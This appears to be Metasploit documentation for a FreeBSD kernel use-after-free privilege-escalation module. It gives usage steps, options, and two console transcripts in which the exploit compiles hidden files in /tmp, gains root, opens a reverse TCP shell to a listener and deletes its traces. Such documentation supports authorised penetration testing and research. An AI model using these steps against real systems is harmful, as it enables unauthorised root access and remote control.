## Vulnerable Application

This module exploits a race and use-after-free vulnerability in the
FreeBSD kernel IPv6 socket handling. A missing synchronization lock
in the `IPV6_2292PKTOPTIONS` option handling in `setsockopt` permits
racing `ip6_setpktopt` access to a freed `ip6_pktopts` struct.

This exploit overwrites the `ip6po_pktinfo` pointer of a `ip6_pktopts`
struct in freed memory to achieve arbitrary kernel read/write.

This module has been tested successfully on:

* FreeBSD 9.0-RELEASE #0 (amd64)
* FreeBSD 9.1-RELEASE #0 r243825 (amd64)
* FreeBSD 9.2-RELEASE #0 r255898 (amd64)
* FreeBSD 9.3-RELEASE #0 r268512 (amd64)
* FreeBSD 12.0-RELEASE r341666 (amd64)
* FreeBSD 12.1-RELEASE r354233 (amd64)


## Verification Steps

1. Start `msfconsole`
2. Get a session
3. `use exploit/freebsd/local/ip6_setpktopt_uaf_priv_esc`
4. `set SESSION <SESSION>`
5. `check`
6. `run`
7. You should get a new *root* session


## Options

### NUM_SPRAY

Spray iterations (default (`256`)

### NUM_SPRAY_RACE

Race iterations (default: `32`)

### ForceExploit

Override check result (default: `false`)

### WritableDir

A directory where we can write files (default: `/tmp`)


## Scenarios

### FreeBSD 9.3-RELEASE #0 r268512 (amd64)

```
msf5 > use exploit/freebsd/local/ip6_setpktopt_uaf_priv_esc
[*] Using configured payload bsd/x64/shell_reverse_tcp
msf5 exploit(freebsd/local/ip6_setpktopt_uaf_priv_esc) > set lhost 172.16.191.165
lhost => 172.16.191.165
msf5 exploit(freebsd/local/ip6_setpktopt_uaf_priv_esc) > set session 1
session => 1
msf5 exploit(freebsd/local/ip6_setpktopt_uaf_priv_esc) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 172.16.191.165:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] Using target: FreeBSD 9.3-RELEASE #0 r268512 - allproc offset: 0x1295800
[*] Writing '/tmp/.SnZgWBMA.c' (14147 bytes) ...
[*] Compiling /tmp/.SnZgWBMA.c ...
[*] Writing '/tmp/.d97xapNItz' (218 bytes) ...
[*] Launching exploit (timeout: 30s) ...
[*] uid=0(root) gid=0(wheel) egid=1002(asdf) groups=1002(asdf)
[+] Success! Executing payload...
[*] Command shell session 2 opened (172.16.191.165:4444 -> 172.16.191.142:61848) at 2020-07-09 18:02:09 -0400
[+] Deleted /tmp/.SnZgWBMA.c
[+] Deleted /tmp/.SnZgWBMA
[+] Deleted /tmp/.d97xapNItz

id
uid=0(root) gid=0(wheel) egid=1002(asdf) groups=1002(asdf)
uname -a
FreeBSD freebsd-9-3-amd64 9.3-RELEASE FreeBSD 9.3-RELEASE #0 r268512: Thu Jul 10 23:44:39 UTC 2014     root@snap.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64
```

### FreeBSD 12.1-RELEASE r354233 (amd64)

```
msf5 > use exploit/freebsd/local/ip6_setpktopt_uaf_priv_esc
[*] Using configured payload bsd/x64/shell_reverse_tcp
msf5 exploit(freebsd/local/ip6_setpktopt_uaf_priv_esc) > set lhost 172.16.191.165
lhost => 172.16.191.165
msf5 exploit(freebsd/local/ip6_setpktopt_uaf_priv_esc) > set session 1
session => 1
msf5 exploit(freebsd/local/ip6_setpktopt_uaf_priv_esc) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 172.16.191.165:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] Using target: FreeBSD 12.1-RELEASE r354233 - allproc offset: 0x1df7648
[*] Writing '/tmp/.V8vZ5.c' (14162 bytes) ...
[*] Compiling /tmp/.V8vZ5.c ...
[*] Writing '/tmp/.ok9laPn' (218 bytes) ...
[*] Launching exploit (timeout: 30s) ...
[*] uid=0(root) gid=0(wheel) egid=1002(asdf) groups=1002(asdf)
[+] Success! Executing payload...
[*] Command shell session 2 opened (172.16.191.165:4444 -> 172.16.191.140:35808) at 2020-07-09 18:04:24 -0400
[+] Deleted /tmp/.V8vZ5.c
[+] Deleted /tmp/.V8vZ5
[+] Deleted /tmp/.ok9laPn

id
uid=0(root) gid=0(wheel) egid=1002(asdf) groups=1002(asdf)
uname -a
FreeBSD freebsd-12-1-amd64 12.1-RELEASE FreeBSD 12.1-RELEASE r354233 GENERIC  amd64
```

